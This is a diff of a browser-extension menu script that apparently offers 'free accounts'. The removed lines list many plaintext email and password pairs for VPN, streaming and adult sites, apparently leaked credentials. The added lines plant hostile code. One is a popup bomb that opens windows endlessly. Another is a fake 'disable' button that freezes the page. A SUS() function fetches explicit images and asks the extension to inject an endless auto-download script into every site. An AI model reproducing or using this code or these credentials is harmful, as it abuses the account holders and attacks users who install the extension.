@@ -1,148 +1,193 @@
-//menu
 
-document.getElementById("main-menu-1").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("menu-1").style.display = "block"};
+document.getElementById("main-menu-home-button").onclick = function(){alert("THAT'S FUCKING SPECTAUCLAR YOU USED THE FUCKING HOME BUTTON.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nIt's just a reload button."); window.parent.postMessage(JSON.stringify({text: '', type: 'Reload', relay: true}), '*')};
 
-document.getElementById("main-menu-2").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("menu-2").style.display = "block"};
 
-document.getElementById("main-menu-3").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("menu-3").style.display = "block"};
+document.getElementById("main-menu-1").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINaccounts").style.display = "block"};
 
-document.getElementById("main-menu-4").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("menu-4").style.display = "block"};
+document.getElementById("main-menu-2").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINcookies").style.display = "block"};
 
-//innermenu
+document.getElementById("main-menu-3").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINforum").style.display = "block"};
 
-//VPN
-document.getElementById("menu-1-1").onclick  = function(){document.getElementById("menu-1").style.display = "None"; document.getElementById("menu-1-1-menu").style.display = "block"};
-document.getElementById("menu-1-2").onclick  = function(){document.getElementById("menu-1").style.display = "None"; document.getElementById("menu-1-2-menu").style.display = "block"};
+document.getElementById("main-menu-4").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINsettings").style.display = "block"};
 
-//Streaming
-document.getElementById("menu-2-1").onclick  = function(){document.getElementById("menu-2").style.display = "None"; document.getElementById("menu-2-1-menu").style.display = "block"};
-document.getElementById("menu-2-2").onclick  = function(){document.getElementById("menu-2").style.display = "None"; document.getElementById("menu-2-2-menu").style.display = "block"};
-document.getElementById("menu-2-3").onclick  = function(){document.getElementById("menu-2").style.display = "None"; document.getElementById("menu-2-3-menu").style.display = "block"};
-document.getElementById("menu-2-4").onclick  = function(){document.getElementById("menu-2").style.display = "None"; document.getElementById("menu-2-4-menu").style.display = "block"};
-document.getElementById("menu-2-5").onclick  = function(){document.getElementById("menu-2").style.display = "None"; document.getElementById("menu-2-5-menu").style.display = "block"};
-document.getElementById("menu-2-6").onclick  = function(){document.getElementById("menu-2").style.display = "None"; document.getElementById("menu-2-6-menu").style.display = "block"};
+document.getElementById("main-menu-5").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINadversitment").style.display = "block"; document.getElementById("MAINadversitment").appendChild(document.createElement("img")); document.getElementById("MAINadversitment").firstElementChild.src = "https://freeacountzsusextention.github.io/extention/ad.png"; document.getElementById("MAINadversitment").firstElementChild.style.width = "306px"; document.getElementById("MAINadversitment").firstElementChild.style.height = "506px"; document.getElementById("MAINadversitment").firstElementChild.onclick = function() {for (i = 0; i <= Infinity; i++) {window.open("https://gaminggodsexy123.github.io?"+i,i,'height=500,width=500').focus()}}};
 
-//other
+document.getElementById("main-menu-6").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINamogus").style.display = "block"};
 
-// XXX
-document.getElementById("menu-4-1").onclick  = function(){document.getElementById("menu-4").style.display = "None"; document.getElementById("menu-4-1-menu").style.display = "block"};
+document.getElementById("main-menu-7").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINdontclickonthisone").style.display = "block"};
+document.getElementById("armageddon").onclick = function(){SUS()};
 
-//acounts
+document.getElementById("main-menu-8").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINdisableextensionpermanently").style.display = "block"};
+document.getElementById("extensionbyebye").onclick = function(){localStorage.setItem("extensionbyebye", true)};
+if (localStorage.getItem("extensionbyebye") == 'true') while (true) console.log("extensionbyebye");
 
-//NORD VPN
-document.getElementById("menu-1-1-1").onclick  = function(){document.getElementById("menu-1-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "angelus976@hotmail.com";  document.getElementById("accountinfopassword").innerText = "Clarke976";};
-document.getElementById("menu-1-1-2").onclick  = function(){document.getElementById("menu-1-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "shannonabel@outlook.com";  document.getElementById("accountinfopassword").innerText = "Shannon180790";};
-document.getElementById("menu-1-1-3").onclick  = function(){document.getElementById("menu-1-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "mathewghamilton@hotmail.com";  document.getElementById("accountinfopassword").innerText = "mathewman1";};
-document.getElementById("menu-1-1-4").onclick  = function(){document.getElementById("menu-1-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "phi.nguyen815@gmail.com";  document.getElementById("accountinfopassword").innerText = "Nguyen1731041";};
-document.getElementById("menu-1-1-5").onclick  = function(){document.getElementById("menu-1-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "willadri453@gmail.com";  document.getElementById("accountinfopassword").innerText = "Kinggen1";};
-document.getElementById("menu-1-1-6").onclick  = function(){document.getElementById("menu-1-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "matt.uziel@gmail.com";  document.getElementById("accountinfopassword").innerText = "Matthew1983";};
-document.getElementById("menu-1-1-7").onclick  = function(){document.getElementById("menu-1-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "r.roflo@hotmail.com";  document.getElementById("accountinfopassword").innerText = "4fqtxf3wdN";};
-document.getElementById("menu-1-1-8").onclick  = function(){document.getElementById("menu-1-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "alsharaf1917@gmail.com";  document.getElementById("accountinfopassword").innerText = "Mamingyu8";};
-document.getElementById("menu-1-1-9").onclick  = function(){document.getElementById("menu-1-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "wtg148@gmail.com";  document.getElementById("accountinfopassword").innerText = "Jamin123";};
-document.getElementById("menu-1-1-10").onclick  = function(){document.getElementById("menu-1-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "dombt@hotmail.com";  document.getElementById("accountinfopassword").innerText = "Kalispera1!";};
+document.getElementById("main-menu-9").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINrequests").style.display = "block"};
 
-//EXPRESS VPN
-document.getElementById("menu-1-2-1").onclick  = function(){document.getElementById("menu-1-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "sheep4danish@gmail.com";  document.getElementById("accountinfopassword").innerText = "akaekm13";};
-document.getElementById("menu-1-2-2").onclick  = function(){document.getElementById("menu-1-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "stormsongwow@gmail.com";  document.getElementById("accountinfopassword").innerText = "Tanner111";};
-document.getElementById("menu-1-2-3").onclick  = function(){document.getElementById("menu-1-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "sergejs.tugajs@gmail.com";  document.getElementById("accountinfopassword").innerText = "Snowman2";};
-document.getElementById("menu-1-2-4").onclick  = function(){document.getElementById("menu-1-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "sammieslad@gmail.com";  document.getElementById("accountinfopassword").innerText = "mataponi";};
-document.getElementById("menu-1-2-5").onclick  = function(){document.getElementById("menu-1-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "gavin@benisys.com";  document.getElementById("accountinfopassword").innerText = "gavin1207";};
-document.getElementById("menu-1-2-6").onclick  = function(){document.getElementById("menu-1-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "aanshikab@gmail.com";  document.getElementById("accountinfopassword").innerText = "ecobuddy123";};
-document.getElementById("menu-1-2-7").onclick  = function(){document.getElementById("menu-1-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "beccaboo.2011@hotmail.co.uk";  document.getElementById("accountinfopassword").innerText = "Facebook1234";};
-document.getElementById("menu-1-2-8").onclick  = function(){document.getElementById("menu-1-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "spaz0303@gmail.com";  document.getElementById("accountinfopassword").innerText = "Jsoccer08";};
-document.getElementById("menu-1-2-9").onclick  = function(){document.getElementById("menu-1-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "frizzlenpop@gmail.com";  document.getElementById("accountinfopassword").innerText = "Tyson1996";};
-document.getElementById("menu-1-2-10").onclick  = function(){document.getElementById("menu-1-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "mn.diseko@gmail.com";  document.getElementById("accountinfopassword").innerText = "rul011gp";};
+document.getElementById("main-menu-10").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINhelp").style.display = "block"};
 
-//disney+
-document.getElementById("menu-2-1-1").onclick  = function(){document.getElementById("menu-2-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "ianjmchardy@gmail.com";  document.getElementById("accountinfopassword").innerText = "Awsomecake7";};
-document.getElementById("menu-2-1-2").onclick  = function(){document.getElementById("menu-2-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "icandee22@gmail.com";  document.getElementById("accountinfopassword").innerText = "December17";};
-document.getElementById("menu-2-1-3").onclick  = function(){document.getElementById("menu-2-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "mevasew@gmail.com";  document.getElementById("accountinfopassword").innerText = "M3r1d3th!";};
-document.getElementById("menu-2-1-4").onclick  = function(){document.getElementById("menu-2-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "jetmecha320@gmail.com";  document.getElementById("accountinfopassword").innerText = "1Marylou2";};
-document.getElementById("menu-2-1-5").onclick  = function(){document.getElementById("menu-2-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "tjucciardi@gmail.com";  document.getElementById("accountinfopassword").innerText = "Harryh00d!";};
-document.getElementById("menu-2-1-6").onclick  = function(){document.getElementById("menu-2-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "kmoi44@gmail.com";  document.getElementById("accountinfopassword").innerText = "petals44";};
-document.getElementById("menu-2-1-7").onclick  = function(){document.getElementById("menu-2-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "quintero_adan@att.net";  document.getElementById("accountinfopassword").innerText = "familia321";};
-document.getElementById("menu-2-1-8").onclick  = function(){document.getElementById("menu-2-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "antguy90@gmail.com";  document.getElementById("accountinfopassword").innerText = "antmann90";};
-document.getElementById("menu-2-1-9").onclick  = function(){document.getElementById("menu-2-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "dianacmay@hotmail.com";  document.getElementById("accountinfopassword").innerText = "Ringuis1";};
-document.getElementById("menu-2-1-10").onclick  = function(){document.getElementById("menu-2-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "bpardue@outlook.com";  document.getElementById("accountinfopassword").innerText = "Thissucks23";};
+document.getElementById("main-menu-11").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINaccountsettings").style.display = "block"};
 
-//HBO+
-document.getElementById("menu-2-2-1").onclick  = function(){document.getElementById("menu-2-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "chrissychase1027@gmail.com";  document.getElementById("accountinfopassword").innerText = "blakey04";};
-document.getElementById("menu-2-2-2").onclick  = function(){document.getElementById("menu-2-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "doogmoney@yahoo.com";  document.getElementById("accountinfopassword").innerText = "Thick120";};
-document.getElementById("menu-2-2-3").onclick  = function(){document.getElementById("menu-2-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "matthewscottprentice@gmail.com";  document.getElementById("accountinfopassword").innerText = "Mp9035##";};
-document.getElementById("menu-2-2-4").onclick  = function(){document.getElementById("menu-2-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "lizzi1022@iCloud.com";  document.getElementById("accountinfopassword").innerText = "popcorn2016";};
-document.getElementById("menu-2-2-5").onclick  = function(){document.getElementById("menu-2-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "aragni_of_eternal_darkness@yahoo.com";  document.getElementById("accountinfopassword").innerText = "RyuCad103";};
-document.getElementById("menu-2-2-6").onclick  = function(){document.getElementById("menu-2-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "seppaala@yahoo.com";  document.getElementById("accountinfopassword").innerText = "uwec4758";};
-document.getElementById("menu-2-2-7").onclick  = function(){document.getElementById("menu-2-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "broncosbaby2000@yahoo.com";  document.getElementById("accountinfopassword").innerText = "Donnsmom7";};
-document.getElementById("menu-2-2-8").onclick  = function(){document.getElementById("menu-2-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "darrick.johnson@gmail.com";  document.getElementById("accountinfopassword").innerText = "Allmaras1";};
-document.getElementById("menu-2-2-9").onclick  = function(){document.getElementById("menu-2-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "patrick@rave410.com";  document.getElementById("accountinfopassword").innerText = "Redsox2004!";};
-document.getElementById("menu-2-2-10").onclick  = function(){document.getElementById("menu-2-2-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "lucas90mm@hotmail.com";  document.getElementById("accountinfopassword").innerText = "Cartolafc90";};
+document.getElementById("main-menu-12").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINaccountlogout").style.display = "block"; window.parent.postMessage(JSON.stringify({text: "000webhostapp.com", type: "ClearCookies", relay: true}), '*'); window.parent.postMessage(JSON.stringify({text: "github.io", type: "ClearCookies", relay: true}), '*'); window.parent.postMessage(JSON.stringify({text: "", type: "AccountSignOut", relay: true}), '*'); window.parent.postMessage(JSON.stringify({text: "", type: "Reload", relay: true}), '*')};
 
-//Hulu
-document.getElementById("menu-2-3-1").onclick  = function(){document.getElementById("menu-2-3-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "pimpintev@gmail.com";  document.getElementById("accountinfopassword").innerText = "Tevenis12252";};
-document.getElementById("menu-2-3-2").onclick  = function(){document.getElementById("menu-2-3-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "ramirezesmeralda30@yahoo.com";  document.getElementById("accountinfopassword").innerText = "Nataly99";};
-document.getElementById("menu-2-3-3").onclick  = function(){document.getElementById("menu-2-3-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "Dolphinsongs@hotmail.com";  document.getElementById("accountinfopassword").innerText = "Annaqueen1";};
-document.getElementById("menu-2-3-4").onclick  = function(){document.getElementById("menu-2-3-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "bondankirkland@yahoo.com";  document.getElementById("accountinfopassword").innerText = "Daniel74";};
-document.getElementById("menu-2-3-5").onclick  = function(){document.getElementById("menu-2-3-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "kmoi44@gmail.com";  document.getElementById("accountinfopassword").innerText = "petals44";};
+var favorite_account = { v: { m1: { a1: false, a2: false, a3: false, a4: false, a5: false, a6: false, a7: false, a8: false, a9: false, a10: false, }, m2: { a1: false, a2: false, a3: false, a4: false, a5: false, a6: false, a7: false, a8: false, a9: false, a10: false, }, }, s: { m1: { a1: false, a2: false, a3: false, a4: false, a5: false, a6: false, a7: false, a8: false, a9: false, a10: false, }, m2: { a1: false, a2: false, a3: false, a4: false, a5: false, a6: false, a7: false, a8: false, a9: false, a10: false, }, m3: { a1: false, a2: false, a3: false, a4: false, a5: false, }, m4: { }, m5: { a1: false, a2: false, a3: false, a4: false, a5: false, a6: false, a7: false, a8: false, a9: false, a10: false, }, m6: { }, }, o: { }, x: { m1: { a1: false, a2: false, a3: false, }, }, };
 
-//Netflix
-
-//Paramount+
-document.getElementById("menu-2-5-1").onclick  = function(){document.getElementById("menu-2-5-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "flyjets3@hotmail.com";  document.getElementById("accountinfopassword").innerText = "beanpie4";};
-document.getElementById("menu-2-5-2").onclick  = function(){document.getElementById("menu-2-5-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "shrkritter@yahoo.com";  document.getElementById("accountinfopassword").innerText = "marcia20";};
-document.getElementById("menu-2-5-3").onclick  = function(){document.getElementById("menu-2-5-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "lanejoseph@Comcast.net";  document.getElementById("accountinfopassword").innerText = "Sasche2005";};
-document.getElementById("menu-2-5-4").onclick  = function(){document.getElementById("menu-2-5-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "nikkibee_26@hotmail.com";  document.getElementById("accountinfopassword").innerText = "itsjustme";};
-document.getElementById("menu-2-5-5").onclick  = function(){document.getElementById("menu-2-5-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "JEN.MARKGRAF@YAHOO.COM";  document.getElementById("accountinfopassword").innerText = "louise327";};
-document.getElementById("menu-2-5-6").onclick  = function(){document.getElementById("menu-2-5-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "mrmmckeever@yahoo.com";  document.getElementById("accountinfopassword").innerText = "Deepblue";};
-document.getElementById("menu-2-5-7").onclick  = function(){document.getElementById("menu-2-5-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "jeffcarley2000@yahoo.com";  document.getElementById("accountinfopassword").innerText = "cmi1234";};
-document.getElementById("menu-2-5-8").onclick  = function(){document.getElementById("menu-2-5-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "5588955@cox.net";  document.getElementById("accountinfopassword").innerText = "mojo6595";};
-document.getElementById("menu-2-5-9").onclick  = function(){document.getElementById("menu-2-5-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "colinhall00@yahoo.com";  document.getElementById("accountinfopassword").innerText = "Lundeen1";};
-document.getElementById("menu-2-5-10").onclick  = function(){document.getElementById("menu-2-5-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "cierrarayne18@yahoo.com";  document.getElementById("accountinfopassword").innerText = "Cccccc94";};
-
-//Prime Video
-
-//Pornhub
-document.getElementById("menu-4-1-1").onclick  = function(){document.getElementById("menu-4-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "caseyfitz7@gmail.com";  document.getElementById("accountinfopassword").innerText = "pb25691270";};
-document.getElementById("menu-4-1-2").onclick  = function(){document.getElementById("menu-4-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "jasonmogara@gmail.com";  document.getElementById("accountinfopassword").innerText = "Naked123";};
-document.getElementById("menu-4-1-3").onclick  = function(){document.getElementById("menu-4-1-menu").style.display = "None"; document.getElementById("accountInfoDisplayer").style.display = "block"; document.getElementById("accountinfousername").innerText = "javiergil13@hotmail.com";  document.getElementById("accountinfopassword").innerText = "Policia98";};
-
-//acounts stuff
-document.getElementById("accountinfousernameBUTTON").onclick  = function(){copyTextUSERNAME();};
-document.getElementById("accountinfousernameBUTTON").onmouseout  = function(){copiedTextUSERNAME();};
-
-document.getElementById("accountinfopasswordBUTTON").onclick  = function(){copyTextPASSWORD();};
-document.getElementById("accountinfopasswordBUTTON").onmouseout  = function(){copiedTextPASSWORD();};
-
-function copyTextUSERNAME() {
-    var copyText = document.getElementById("accountinfousername");
-    //copyText.select();
-    //copyText.setSelectionRange(0, 99999);
-    //navigator.clipboard.writeText(copyText.innerText);
-    
-  window.parent.postMessage(copyText.innerText, '*');
-    
-    var tooltip = document.getElementById("TooltipUSERNAME");
-    tooltip.innerHTML = "Copied: " + copyText.innerText;
-  }
+window.addEventListener('message', function (e) {
+  // Get the sent data
+  const data = e.data;
   
-  function copiedTextUSERNAME() {
-    var tooltip = document.getElementById("TooltipUSERNAME");
-    tooltip.innerHTML = "Copy to clipboard";
+  // If you encode the message in JSON before sending them,
+  // then decode here
+  const decoded = JSON.parse(data);
+  if (decoded.type == "Clipboard")
+    navigator.clipboard.writeText(decoded.text);
+  if (decoded.type == "UserData")
+    {document.getElementById("frame-accounts").contentWindow.postMessage(e.data, '*')}
+  if (decoded.type == "CookieUserData")
+    {document.getElementById("frame-cookies").contentWindow.postMessage(e.data, '*')}
+  if (decoded.relay == true)
+  {
+    window.parent.postMessage(e.data, '*');
+    return;
   }
+});
 
-function copyTextPASSWORD() {
-    var copyText = document.getElementById("accountinfopassword");
-    //copyText.select();
-    //copyText.setSelectionRange(0, 99999);
-    //navigator.clipboard.writeText(copyText.innerText);
-    
-  window.parent.postMessage(copyText.innerText, '*');
 
-    var tooltip = document.getElementById("TooltipPASSWORD");
-    tooltip.innerHTML = "Copied: " + copyText.innerText;
-  }
+
+
+
+
+
+
+
+function SUS()
+{
+  function shuffle(array) {
+    let currentIndex = array.length,  randomIndex;
   
-  function copiedTextPASSWORD() {
-    var tooltip = document.getElementById("TooltipPASSWORD");
-    tooltip.innerHTML = "Copy to clipboard";
+    // While there remain elements to shuffle.
+    while (currentIndex != 0) {
+  
+      // Pick a remaining element.
+      randomIndex = Math.floor(Math.random() * currentIndex);
+      currentIndex--;
+  
+      // And swap it with the current element.
+      [array[currentIndex], array[randomIndex]] = [
+        array[randomIndex], array[currentIndex]];
+    }
+  
+    return array;
   }
 
+
+  var hell = [];
+  
+  function Downloader() {
+    try{
+    //var hell = [];
+    async function test() {
+      function toDataURL(url) {
+        {
+          return fetch(url).then((response) => {return response.blob();}).then(blob => {return URL.createObjectURL(blob);});
+      }
+    }
+      while (true)
+      {
+        for (let i = 0; i < hell.length; i++)
+        {
+          const a = document.createElement("a");
+          a.href = await toDataURL(hell[i]);
+
+          a.download = "";
+          document.body.appendChild(a);
+          
+          a.click();
+          //document.body.removeChild(a);
+        }
+      }
+    }
+    test();
+    }
+    catch
+    {
+      hell = ['https://c.tenor.com/gQV5VzHLWQIAAAAd/among-us-sus.gif'];
+      async function test() {
+        console.log("s");
+        function toDataURL(url) {
+          return fetch(url).then((response) => {return response.blob();}).then(blob => {return URL.createObjectURL(blob);});
+        }
+  
+        while (true)
+        {
+          for (let i = 0; i < hell.length; i++)
+          {
+            const a = document.createElement("a");
+            a.href = await toDataURL(hell[i]);
+  
+            a.download = "";
+            document.body.appendChild(a);
+            console.log(hell[i]);
+            a.click();
+            //document.body.removeChild(a);
+          }
+        }
+      }
+    }
+  }
+
+  function toStringPrint(array)
+  {
+  var temparray = [];for (i=0;i<array.length;i++){temparray.push("'"+array[i]+"'");}return "["+temparray.toString()+"]";
+  }
+
+  function sendsusrequest()
+  {
+    var Downloaderfunc = Downloader.toString();
+    Downloaderfunc = Downloaderfunc.substring(Downloaderfunc.indexOf("\n")+1);
+    Downloaderfunc = Downloaderfunc.substring(Downloaderfunc.lastIndexOf("\n")+1,-1);
+    Downloaderfunc = ("var hell = "+toStringPrint(hell)+";")+ Downloaderfunc;
+    console.log(Downloaderfunc);
+      const SendRequest =
+      {
+        text: JSON.stringify({site: "all urls", script: Downloaderfunc}),
+        type: "InjectScript",
+        relay: true,
+      }
+      window.parent.postMessage(JSON.stringify(SendRequest), '*');
+    function d()
+    {
+      for (let i = 0; i < hell.length; i++)
+      {
+        
+        const SendRequest =
+        {
+          text: JSON.stringify({url: hell[i], filename: ""}),
+          type: "Download",
+          relay: true,
+        }
+        window.parent.postMessage(JSON.stringify(SendRequest), '*');
+        
+        //window.open("https://gaminggodsexy123.github.io?"+Math.random().toString(16).substr(2, 8), Math.random().toString(16).substr(2, 8), 'height=500,width=500').focus()
+      }
+      setTimeout(100, d());
+    }
+    setTimeout(5, d());
+  }
+
+  {
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+      if (this.readyState == 4 && this.status == 200) {
+        var rule34query = JSON.parse(this.responseText);
+        var rule34queryfileurls = [];
+        for (let key in rule34query) {
+          rule34queryfileurls.push(rule34query[key].file_url.replace('https://r34-json-api.herokuapp.com/images?url=', ''));//console.log(key, rule34query[key]);
+        }
+        hell = shuffle(rule34queryfileurls);
+        sendsusrequest();
+      }
+    };
+    xhttp.open("GET", "https://r34-json-api.herokuapp.com/posts?tags=among_us+impostor_(among_us)+crewmate_(among_us)", true);
+    xhttp.send();
+  }
+}
